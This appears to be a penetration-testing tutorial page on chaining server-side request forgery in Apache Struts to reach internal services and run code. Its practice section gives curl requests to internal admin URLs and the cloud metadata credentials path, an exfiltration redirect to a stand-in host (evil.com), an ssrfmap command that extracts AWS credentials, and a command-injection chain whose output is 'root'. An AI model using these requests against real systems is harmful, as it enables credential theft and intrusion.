---
title: 'Exploiting Apache Struts: SSRF and RCE Techniques'
description: Learn how to exploit Apache Struts using SSRF to achieve RCE and interact
  with internal services.
keywords:
- Apache Struts
- SSRF
- Remote Code Execution
- RCE
- Exploit Techniques
- Web Application Security
- HTTP protocol
- Struts Vulnerability
- Internal Service Interaction
---

# Apache Struts

## Context

This article aims to demonstrate how to exploit Apache Struts vulnerabilities using Server-Side Request Forgery (SSRF) to achieve remote code execution or interact with sensitive services. The reader is expected to have a good understanding of HTTP protocol mechanics, general web server architecture, and strategy for SSRF exploitation.

## Theory

### Apache Struts SSRF Attack Surface

Apache Struts is a popular Java-based web application framework that, under certain conditions, is susceptible to SSRF. This vulnerability typically occurs when unsanitized user input is used to construct backend HTTP requests, leading to potential exploitation. Typically, susceptible areas include Struts actions or plugins that fetch remote resources based on user-controlled parameters, allowing an attacker to perform SSRF.

### Remote Code Execution via SSRF in Struts

Exploiting SSRF in Apache Struts can lead to remote code execution (RCE) or unauthorized interactions with sensitive systems. An attacker can supply a crafted URL to a vulnerable Struts endpoint, causing the server to initiate an HTTP request to an internal or external service. By directing this request to an internal service that's vulnerable to command injection, an attacker might chain SSRF to achieve RCE. Additionally, the lack of proper request filtering could allow accessing internal-only services or critical metadata endpoints.

### Exploitation Techniques for Struts SSRF

Several exploitation techniques exist for leveraging SSRF in Struts. For example, some Struts plugins, like URLReader, may indiscriminately fetch attacker-supplied URLs. Attackers can use filter bypass techniques, such as IP address obfuscation or encoding (127.0.0.1, localhost, or hex-encoded values), to evade basic security filters intended to block direct local access.

## Practice

### Manual SSRF Exploitation in Apache Struts

- Use `curl` to send a crafted request to a vulnerable Struts endpoint that points to an internal URL:

    ```bash
    curl -X POST 'http://target/struts-app/action' -d 'url=http://127.0.0.1:8080/admin'
    ```

    This exploits the backend request functionality to interact with an internal administration interface.

- Target cloud metadata service to retrieve sensitive credentials:

    ```http
    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```

- Redirect backend requests to an attacker-controlled server to exfiltrate data:

    ```bash
    curl -X POST 'http://target/struts-app/action' -d 'url=http://evil.com/malicious'
    ```

These actions may allow the enumeration and interaction with internal services that are accessible from the Struts server.

### Automated SSRF Exploitation with SSRFmap

- Automate the process of delivering SSRF payloads and targeting cloud credentials using `ssrfmap`:

    ```bash
    ssrfmap -r 'http://target/struts-app/action?url=FUZZ' -p 'FUZZ' --data 'url=FUZZ' --exploit aws-credentials
    ```

This command attempts to extract sensitive data, such as AWS credentials, leveraging SSRF within the Struts framework.

### Chaining SSRF to RCE via Internal Service

- Execute an SSRF attack targeting an internal admin interface with command injection:

    ```bash
    curl -X POST 'http://target/struts-app/action' -d 'url=http://127.0.0.1:8080/vulnerable-admin?cmd=whoami'
    ```

- Observe the output:

    ```
    root
    ```

This technique demonstrates how SSRF can be used to achieve RCE on internal systems by chaining it with command injection.

## Tools

- **curl**
- **ssrfmap**